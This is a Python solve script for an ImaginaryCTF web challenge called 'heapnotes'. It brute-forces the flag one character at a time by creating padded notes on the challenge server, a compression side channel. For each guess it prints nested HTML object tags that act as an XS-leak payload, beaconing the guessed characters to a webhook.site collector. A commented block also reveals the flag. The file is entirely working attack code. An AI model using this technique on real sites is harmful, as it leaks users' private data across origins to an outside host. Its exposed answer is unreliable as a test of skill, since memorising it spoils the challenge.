import zlib
import os
import random
import string
import requests
import re

import http.client
http.client._MAXLINE = 655360
'''
# admin bot
s = requests.Session()
flag = "ictf{compress_n_xsleak_9b53be55}"
s.post("https://heapnotes.chal.imaginaryctf.org/register", data={"username": flag, "password": "asdf"})
s.post("https://heapnotes.chal.imaginaryctf.org/login", data={"username": flag, "password": "asdf"})
'''

u = requests.Session()
u.post("https://heapnotes.chal.imaginaryctf.org/register", data={"username": "test", "password": "test"})
u.post("https://heapnotes.chal.imaginaryctf.org/login", data={"username": "test", "password": "test"})

t = "ictf{"
while not "}" in t:
  for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
    note_id = u.post("https://heapnotes.chal.imaginaryctf.org/create", data={"content": t+c, "key": "0"*65374}).text
    print(f"""<object data="https://heapnotes.chal.imaginaryctf.org/note/{note_id}">
    <object data="https://webhook.site/8af396a8-f0c0-439b-9ef0-45e50fecd8ad?f={t+c}"></object>
</object>""")
